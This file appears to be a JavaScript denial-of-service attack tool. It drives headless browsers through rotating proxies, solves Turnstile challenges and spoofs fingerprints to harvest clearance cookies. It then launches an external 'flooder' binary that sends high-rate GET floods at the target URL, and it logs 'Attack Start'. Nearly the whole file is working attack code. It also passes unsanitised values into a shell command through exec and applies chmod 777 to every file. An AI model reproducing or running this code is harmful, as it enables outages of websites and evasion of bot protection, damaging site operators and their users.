import { connect } from './script/index.js';
import cluster from 'cluster';
import os from 'os';
import fs from 'fs';
import { exec } from 'child_process';

const proxy = fs.readFileSync(process.argv[6], 'utf-8').toString().replace(/\r/g, '').split('\n');
const rps = process.argv[5];
const threads = process.argv[4];
const time = process.argv[3];
const url = process.argv[2];
function log(string) {
    let d = new Date();
    let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
    let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
    let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();

}

async function go() {
    const pxdata = proxy[Math.floor(Math.random() * proxy.length)];
    const sajdm = pxdata.split(':');
    const { page, browser } = await connect({
         headless: 'auto',
         args: [],
         customConfig: {},
         skipTarget: [],
         fingerprint: true,
         turnstile: true,
         connectOption: {},
         tf: true,
         proxy:{
           host: sajdm[0],
           port: sajdm[1],
           username: sajdm[2],
           password: sajdm[3]
        }
    });
    await page.goto(url, {
        waitUntil: 'domcontentloaded'
    });
    const sdo = await page.title();
    console.log(`Title: ${sdo} | Proxy: ${sajdm[0]}`);
    await page.waitForTimeout(50000);
    const cookie = await page.cookies();
    const cookieString = cookie.map((c) => `${c.name}=${c.value}`).join("; ");
    if (cookie) {
        console.log(`Flooder | Title: ${sdo} | Cookie: ${cookieString}`);
        const userAgent = await page.evaluate(() => navigator.userAgent);
        exec(`chmod 777 * && screen -dmS ${sajdm[0]} timeout 40 ./flooder GET ${url} 30 ${threads} ${rps} ${pxdata} --cookie "${cookieString}" --ua "${userAgent}"`);
    }
    await browser.close();
}

if (cluster.isMaster) {
const workers = {}
    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    console.log(`Attack Start / @mscjs love you <3 / Browser v8.4`);

    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    cluster.on('message', (worker, message) => {
        workers[worker.id] = [worker, message]
    })
    setTimeout(() => process.exit(1), time * 1000);
} else {
    setInterval(() => {
       go();
    }, 10000);
}